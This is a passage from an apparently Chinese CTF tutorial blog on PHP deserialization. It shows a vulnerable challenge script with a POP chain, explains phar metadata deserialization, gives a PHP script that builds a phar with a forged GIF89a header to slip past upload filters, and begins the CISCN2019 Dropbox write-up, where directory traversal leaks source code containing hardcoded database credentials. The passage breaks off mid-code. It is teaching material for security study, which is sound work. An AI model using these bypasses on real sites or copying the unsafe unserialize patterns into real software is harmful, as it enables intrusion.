class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">'index.php'</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source.<span class="string">'Welcome'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str[<span class="string">'str'</span>]-&gt;source;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">'/gopher|http|ftp|https|dict|\.\.|flag|file/i'</span>,<span class="variable">$this</span>-&gt;source))  {</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker'</span>);</span><br><span class="line">        } <span class="keyword">else</span> {</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source); </span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="variable">$this</span>-&gt;source)) {</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">'hello'</span>]))</span><br><span class="line">{</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">'hello'</span>]);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">{</span><br><span class="line">    <span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(<span class="string">'pop3.php'</span>);</span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>();</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>2. 找出魔术方法，构造 pop 链</p><h2 id="phar反序列化"><a class="markdownIt-Anchor" href="#phar反序列化"></a> phar 反序列化</h2><p>phar 是一种 php 程序的一种打包文件，类似与 java 中的 jar 文件，无需解压，直接通过 phar:// 伪协议读取内容。</p><p>一个 phar 文件一般有四个部分：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.stub:它是phar文件的文件头，格式为xxxxx&lt;?php xxx; __HALT_COMPILER();?&gt;,这种格式是固定的。前面的可以不管，但必须以__HALT_COMPILER();?&gt;结尾。生成文件的后缀名为phar。这种格式就相当于gif图片中的GIF89a一样。没有这个格式就不会识别这是一个phar文件。</span><br><span class="line"></span><br><span class="line">2.a manifest describing the contents:phar文件中被压缩的文件的一些信息，以及一些权限信息。其中Meta-data部分的信息会进行序列化并储存，这就是phar反序列化的精髓。我们可以把exp放在Meta-data内。</span><br><span class="line"></span><br><span class="line">3.the file contents:这里放的是压缩文件的内容，这里的内容可以随便写</span><br><span class="line"></span><br><span class="line">4.a signature for verifying Phar integrity 这是一个签名，在这里不用管。(签名就是对全文进行加密，为了防止文件内容丢失或者修改，如果签名进行解密与全文不匹配，就会拒绝解析。)</span><br></pre></td></tr></tbody></table></figure><p>phar 伪协议</p><p>因为 phar 就是将多个文档压缩到一个文件当中，phar 文件中的 Mata-data 会进行序列化，在我们访问 phar 文件中的文档时，我们不需要对它进行解压。可以通过 phar:// 为协议对文件进行读取。当 phar 文件被解析时，Meta-data 中的数据就会被反序列化。</p><p>构造 phar 文件</p><p>在本地生成一个 phar 文件，并想使用 phar 类里面的方法，就必须 ** 将 php.ini 配置文件中的 phar.readonly 改为 0 或者 off（前面分号是注释，删掉）** 这个 phar 压缩文件并不是右键点击一键生成的，而是通过写脚本来生成这个 phar 文件的。</p><p>接下来在本地实验生成 phar 文件。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">testobj</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title function_ invoke__">phar</span>(<span class="string">'test.phar'</span>);<span class="comment">//对phar对象进行实例化，以便后续操作。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">startBuffering</span>();<span class="comment">//缓冲phar写操作（不用特别注意）</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setStub</span>(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="comment">//设置stub，为固定格式</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//把我们的对象写进Metadata中，漏洞利用重点所在</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">addFromString</span>(<span class="string">"test.txt"</span>,<span class="string">"hello world!!"</span>);<span class="comment">//写压缩文件的内容，这里没利用点，可以随便写</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> -&gt; <span class="title function_ invoke__">stopBuffering</span>();<span class="comment">//停止缓冲</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在上传场景中，我们可以将 phar 伪造成其他格式的文件。识别 phar 文件只需添加<!--?php __HALT_COMPILER(); ?-->这个文件头就可以了。那我们就可以添加别的文件头进行伪造了。例如 $phar-&gt;setStub ("GIF89a"."<!--?php __HALT_COMPILER();  ?-->"); 添加 gif 的文件头绕过上传机制。</p><p>运行完成会在当前目录生成一个文件 ---test.phar</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221447274.png" alt="image-20221019144043718"></p><p>可以看到，自己构造的 test 类被序列化了。再试一下能不能反序列化。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>{</span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)//对象在反序列化时自动触发</span></span><br><span class="line"><span class="function">     </span>{</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;str;<span class="comment">//检验是否进行了反序列化</span></span><br><span class="line">     }</span><br><span class="line">}</span><br><span class="line"><span class="variable">$filename</span> =  <span class="string">"phar://test.phar/test.txt"</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221447332.png" alt="image-20221019144532188"></p><p>可以看到用 phar 伪协议能够正常读取，代表 Meta-data 中的数据能被正常反序列化。 php 一大部分的文件系统函数在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，受影响的函数如下：<img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221447510.png" alt="image-20221019145705074"></p><p>来个例题巩固一下</p><h3 id="ciscn2019-华北赛区-day1-web1dropbox"><a class="markdownIt-Anchor" href="#ciscn2019-华北赛区-day1-web1dropbox"></a> [CISCN2019 华北赛区 Day1 Web1] Dropbox</h3><p>打开页面发现注册框和登录框，先试一下万能密码和 sql 注入。无果后直接注册登录，发现了文件上传的地方。尝试常见的文件上传绕过，经过一系列尝试，发现通过修改 mime 文件头能狗传上 php 文件，但是文件类型被改成了 jpg，代表不能利用，传不上马。然后发现了文件下载的按钮，尝试目录穿越，任意文件包含。果然存在，但没啥用，找了半天找不到 flag。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221448359.png" alt="image-20221019161139768"></p><p>然后就想着把知道的文件的源码下载下来，首先是 download.php，发现不存在，可能文件在上传文件的父目录，尝试过后是../../ 在两级目录。</p><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//download.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">'login'</span>])) {</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">'filename'</span>])) {</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">"open_basedir"</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">'sandbox'</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">"flag"</span>) === <span class="literal">false</span>) {</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">"Content-Disposition: attachment; filename="</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">'login'</span>])) {</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">"static/css/panel.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/jquery.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/toast.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">"static/js/panel.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">"breadcrumb"</span>&gt;</span><br><span class="line">    &lt;ol <span class="class"><span class="keyword">class</span>="<span class="title">breadcrumb</span>"&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>="<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>"&gt;管理面板&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>="<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>"&gt;&lt;<span class="title">label</span> <span class="title">for</span>="<span class="title">fileInput</span>" <span class="title">class</span>="<span class="title">fileLabel</span>"&gt;上传文件&lt;/<span class="title">label</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>="<span class="title">active</span> <span class="title">ml</span>-<span class="title">auto</span>"&gt;&lt;<span class="title">a</span> <span class="title">href</span>="#"&gt;你好 &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SESSION</span>['<span class="title">username</span>']?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ol</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>="<span class="title">file</span>" <span class="title">id</span>="<span class="title">fileInput</span>" <span class="title">class</span>="<span class="title">hidden</span>"&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>="<span class="title">top</span>" <span class="title">id</span>="<span class="title">toast</span>-<span class="title">container</span>"&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> "<span class="title">class</span>.<span class="title">php</span>";</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">a</span> = <span class="title">new</span> <span class="title">FileList</span>($<span class="title">_SESSION</span>['<span class="title">sandbox</span>']);</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Name</span>();</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Size</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">"127.0.0.1"</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">"root"</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">"root"</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">"dropbox"</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>{</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>{</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;db = <span class="variable">$db</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>{</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">"SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;"</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">"s"</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">store_result</span>();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>{</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">"INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);"</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">"ss"</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>{</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">user_exist</span>(<span class="variable">$username</span>)) {</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$password</span> . <span class="string">"SiAchGHmFx"</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">"SELECT `password` FROM `users` 